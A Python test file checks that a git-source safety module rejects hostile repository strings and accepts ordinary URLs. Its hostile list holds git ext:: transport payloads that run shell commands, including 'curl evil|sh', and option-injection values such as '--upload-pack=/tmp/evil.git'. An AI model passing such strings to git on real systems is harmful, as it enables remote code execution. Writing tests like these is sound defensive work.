"""Interface tests for the single git-source-safety owner (architecture report #1).

Seam under test: hermes_cli/git_source_safety — the one module that answers
"is this string safe to hand to git?" and shapes the https shorthand.
Callers keep their own error types; this interface owns the RULE.
"""

from pathlib import Path

import pytest

from hermes_cli.git_source_safety import canonical_git_url, reject_reason

HOSTILE = [
    "ext::sh -c touch /tmp/pwned.git",
    "ext::/bin/sh -c 'curl evil|sh'",
    "fd::11/git-upload-pack",
    "--upload-pack=/tmp/evil.git",
    "--upload-pack=evil.git",
    "-u Exploit.git",
    "--mirror=ext::x.git",
    "-",
    "--",
]

LEGIT = [
    "https://github.com/org/repo.git",
    "http://host/repo",
    "git@github.com:org/repo.git",
    "ssh://git@host/path/repo.git",
    "git://host/repo.git",
    "github.com/org/repo",
    "github.com/org/repo.git",
    "https://gitlab.com/group/sub/project.git",
]


@pytest.mark.parametrize("source", HOSTILE)
def test_hostile_sources_are_rejected(source):
    assert reject_reason(source) is not None, f"accepted unsafe source: {source!r}"


@pytest.mark.parametrize("source", LEGIT)
def test_legit_sources_are_accepted(source):
    assert reject_reason(source) is None, f"rejected legit source: {source!r}"


def test_reason_names_the_class():
    assert reject_reason("--upload-pack=x.git") == "option-injection"
    assert reject_reason("ext::sh -c whoami") == "external-transport"


def test_github_shorthand_canonicalises():
    assert canonical_git_url("github.com/org/repo") == "https://github.com/org/repo"
    assert canonical_git_url("github.com/org/repo/") == "https://github.com/org/repo"
    # non-shorthand passes through untouched
    assert canonical_git_url("git@github.com:org/repo.git") == "git@github.com:org/repo.git"


def test_empty_and_whitespace_are_rejected():
    assert reject_reason("") is not None
    assert reject_reason("   ") is not None
